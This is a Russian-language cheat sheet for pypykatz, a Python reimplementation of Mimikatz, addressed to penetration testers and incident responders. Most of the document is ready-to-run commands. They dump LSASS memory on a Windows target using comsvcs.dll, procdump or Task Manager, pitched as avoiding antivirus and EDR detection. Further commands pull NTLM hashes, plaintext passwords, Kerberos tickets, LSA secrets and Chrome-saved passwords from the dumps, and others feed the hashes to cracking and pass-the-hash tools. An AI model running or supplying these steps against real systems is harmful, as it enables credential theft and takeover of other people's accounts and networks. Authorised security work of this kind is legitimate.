<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# pypykatz Шпаргалка

[pypykatz](https://github.com/skelsec/pypykatz) — это реализация [Mimikatz] на чистом Python (https://github.com/gentilkiwi/mimikatz). Оно позволяет тестерам на проникновение и специалистам по реагированию на инциденты анализировать дампы памяти Windows LSASS, кусты реестра SAM/SYSTEM/SECURITY, ключи DPAPI и билеты Kerberos полностью в автономном режиме в Linux и macOS без запуска Защитника Windows, агентов обнаружения и реагирования конечных точек (EDR) или необходимости доступа к хосту Windows в реальном времени.

---

## Содержание

- [Обзор и эксплуатационная безопасность (OpSec)](#overview--operational-security-opsec)
- [Установка](#установка)
- [Автономный анализ дампа LSASS (`lsa minidump`)](#offline-lsass-dump-parsing-lsa-minidump)
- [SAM & SYSTEM Hive Extraction (`registry sam`)](#sam--system-hive-extraction-registry-sam)
- [Извлечение секретов LSA (`registry security`)](#lsa-secrets-extraction-registry-security)
- [Главные ключи DPAPI и анализ учетных данных](#dpapi-master-keys--credential-parsing)
- [Экспорт JSON и автоматизированные конвейеры учетных данных](#json-export--automated-credential-pipelines)
- [Методы безопасного дампа LSASS в Windows](#techniques-to-safely-dump-lsass-on-windows)

---

## Обзор и эксплуатационная безопасность (OpSec)

При запуске стандартного `mimikatz.exe` на целевой машине Windows часто отключаются поведенческие датчики и статические сигнатуры. `pypykatz` отделяет фазу дампа от фазы анализа:
1. Создайте дамп памяти процесса LSASS с помощью собственных инструментов или инструментов LOLBAS (Диспетчер задач, `procdump`, `rundll32.exe` или `comsvcs.dll`).
2. Перенесите файл `.dmp` в свою систему анализа Linux.
3. Анализируйте учетные данные полностью в автономном режиме с помощью `pypykatz` с нулевым AV-риском.

---

## Установка
```bash
# Recommended: Install via pipx
pipx install pypykatz

# Or via standard pip
python3 -m pip install --user pypykatz

# From source
git clone https://github.com/skelsec/pypykatz.git
cd pypykatz
pip install .

# Verify installation
pypykatz -h
```
---

## Автономный анализ дампа LSASS (`lsa minidump`)

Анализ дампов памяти, сгенерированных `lsass.exe`, для получения паролей в открытом виде, хэшей NTLM, хэшей SHA1, билетов Kerberos (TGT/TGS) и ключей шифрования AES:

### 1. Базовый анализ минидампа
```bash
pypykatz lsa minidump /path/to/lsass.dmp
```
В выводе извлекаются учетные данные, разделенные по поставщикам безопасности:
- **msv1_0:** Имена пользователей, домены, хэши NTLM и хеши LM.
- **wdigest:** Пароли в открытом виде (если включено кэширование WDigest).
- **kerberos:** сеансы билетов Kerberos и ключи AES.
- **ssp:** Учетные данные поставщика поддержки безопасности.
- **livessp:** Учетные данные учетной записи Microsoft.
— **cloudap:** Первичные токены обновления Azure AD (PRT) и ключи сеанса.

### 2. Рекурсивный анализ нескольких дампов памяти
```bash
pypykatz lsa minidump /loot/dumps/ -r
```
---

## SAM И СИСТЕМА Извлечение улья (`registry sam`)

Извлеките имена пользователей локальных учетных записей, идентификаторы RID и хэши паролей NTLM из автономных копий куста реестра Windows:
```bash
pypykatz registry sam /loot/SYSTEM /loot/SAM
```
Выход:
```text
RID: 500
Username: Administrator
LM: None
NT: 31d6cfe0d16ae931b73c59d7e0c089c0
```
---

## Извлечение секретов LSA (`registry security`)

Восстановите секреты LSA, пароли учетных записей компьютеров, пароли домена по умолчанию и ключи открытого текста учетной записи службы из кустов `SECURITY` и `SYSTEM`:
```bash
pypykatz registry security /loot/SYSTEM /loot/SECURITY
```
Извлеченные секреты включают в себя:
- `_SC_DefaultPassword`: учетные данные для автоматического входа.
- `$MACHINE.ACC`: NTLM-хэши учетной записи компьютера домена.
— Кэшированные учетные данные домена (DCC2/mscache2).

---

## Мастер-ключи DPAPI и анализ учетных данных

API защиты данных (DPAPI) шифрует пароли Chrome, ключи Wi-Fi и учетные данные RDP:

### 1. Извлеките главные ключи DPAPI из реестра и системы.
```bash
pypykatz dpapi masterkey /loot/SYSTEM /loot/masterkey_file
```
### 2. Расшифруйте пароли, сохраненные в Chrome
```bash
pypykatz dpapi chrome --masterkey <MASTER_KEY_HEX> /loot/Login_Data
```
---

## Экспорт JSON и автоматизированные конвейеры учетных данных

Экспортируйте проанализированные учетные данные непосредственно в JSON для немедленной обработки в Hashcat, BloodHound или CrackMapExec:
```bash
# Export minidump parsing to structured JSON
pypykatz lsa minidump lsass.dmp -k /tmp/loot_creds.json
```
Извлеките чистые хэши NTLM, используя `jq` для немедленного взлома хеша или передачи хеша:
```bash
jq -r '.logon_sessions[].msv_creds[] | "\(.username):\(.NT)"' /tmp/loot_creds.json | grep -v 'None' | sort -u > ntlm_hashes.txt
```
---

## Методы безопасного дампа LSASS в Windows

Чтобы передать память в `pypykatz`, создайте минидамп LSASS на целевом хосте, используя собственные компоненты:

### 1. Собственный LOLBAS через `comsvcs.dll` (администратор PowerShell)
```powershell
# Get LSASS process ID
$pid = (Get-Process lsass).Id

# Execute dump using native rundll32
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $pid C:\Windows\Temp\lsass.dmp full
```
### 2. Графический интерфейс диспетчера задач
1. Откройте диспетчер задач от имени администратора.
2. В разделе **Подробнее** щелкните правой кнопкой мыши `lsass.exe`.
3. Нажмите **Создать файл дампа** (сохранено в `%TEMP%\lsass.DMP`).

### 3. Sysinternals `procdump`
```cmd
procdump.exe -ma -accepteula lsass.exe C:\Temp\lsass.dmp
```
*После загрузки на ваш компьютер с Linux выполните `pypykatz lsa minidump lsass.dmp`.*